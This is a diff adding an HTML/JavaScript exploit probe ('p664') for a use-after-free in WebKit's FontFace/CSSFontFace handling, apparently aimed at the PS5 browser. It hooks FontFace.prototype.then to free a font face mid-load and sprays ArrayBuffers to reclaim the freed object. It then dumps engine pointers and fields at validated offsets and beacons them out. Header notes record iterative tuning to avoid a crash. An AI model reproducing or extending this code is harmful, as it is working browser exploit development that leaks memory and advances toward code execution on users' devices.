@@ -1,0 +1,190 @@
+<!--
+  p664: full-window forensics + timer-safe display
+  White-box turn: layout_probe.cpp VALIDATED (17/17 offsets, x64 LP64 = PS5 Zen2 ABI):
+    +0x00 rc | +0x58 m_clients.m_set.m_table | +0x60 opCount(u32)
+    +0x68 m_wrapper.m_impl | +0x82 m_status(u8) | +0x90 m_timeoutTimer.vptr
+
+  NEW in this probe (vs p663):
+    1. display:'swap' in BOTH the CSS rule and the JS FontFace options.
+       Source proof (CSSFontFace.cpp fontLoadTiming):
+         swap => { block=0s, swap=inf }
+         setStatus(Loading)  : block==0 -> setStatus(TimedOut) SYNCHRONOUS, no timer
+         setStatus(TimedOut) : swap==inf -> isfinite false -> NO timer armed
+       => the 3s vcall timebomb on the zeroed vptr (+0x90) NEVER arms.
+       If R5+ survive (p663 died), we PROVE the crash was the timeout timer.
+    2. FULL 192-byte dump of the hit lane: every non-zero qword + its offset.
+       New readable engine writes expected:
+         +0x82 m_status transitions (setStatus writes through dangling ref)
+         +0x60 opCount increments (addClient -> amortizedCleanupIfNeeded)
+         +0x00 rc increments (ref() at add-time)
+       Any non-zero >= +0x80 is NEW signal never captured before.
+    3. Second snapshot at +3500ms (past the old 3s death mark): late status
+       writes (font resolves -> Success) + survival proof.
+
+  Rounds: 8 (timer threat removed). Faces kept alive (p656b law).
+  Beacon: P664-.
+  CRASH_CLASS: expected LOW (timer disarmed); fallback观察 R4 as before.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p664</title></head>
+<body>p664: fullwindow forensics + swap-display timer-safe
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P664-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'fullwindow swap-display r8');
+flush();
+
+var ROUNDS = 8;
+var round = 0;
+var results = [];
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+var snap1 = null, snap2 = null;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 100 + round, true);   /* rc seed encodes round */
+      dv.setUint32(0x04, 0x5A5A0000 | round, true);
+      dv.setUint32(0x08, i, true);             /* lane id */
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  /* every non-zero qword in the full 192B window */
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function snapshot() {
+  /* compact status of the hit lane at key offsets */
+  return {
+    rc:  null, lane: -1
+  };
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  /* display:swap in the CSS rule too */
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; font-display: swap; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041', display: 'swap' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);   /* p656b law: keep wrapper rooted */
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+}
+
+function analyzeEarly() {
+  try {
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS');
+      flush();
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      results.push({ r: round, lane: hit,
+        t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo),
+        rc: dv.getUint32(0x00, true),
+        opc: dv.getUint32(0x60, true),
+        st: dv.getUint8(0x82) });
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+      flush();
+    }
+    /* late pass: 3500ms past round start = past the OLD 3s death mark */
+    setTimeout(function() { analyzeLate(hit); }, 3350);
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate(hit) {
+  try {
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      var changed = snap1 !== snap2s;
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' opc=' + dv.getUint32(0x60, true) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (changed ? 'YES' : 'no'));
+      if (changed) { emit('R' + round + 'DUMP2', snap2s.slice(0, 700)); }
+      flush();
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+      flush();
+    }
+    round++;
+    if (round < ROUNDS) {
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [], sts = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+        sts.push(results[k].st);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'rounds=' + results.length + ' distinctT=' + keys.length +
+           ' lanes=[' + lanes.join(',') + '] st82=[' + sts.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r8-timer-safe');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
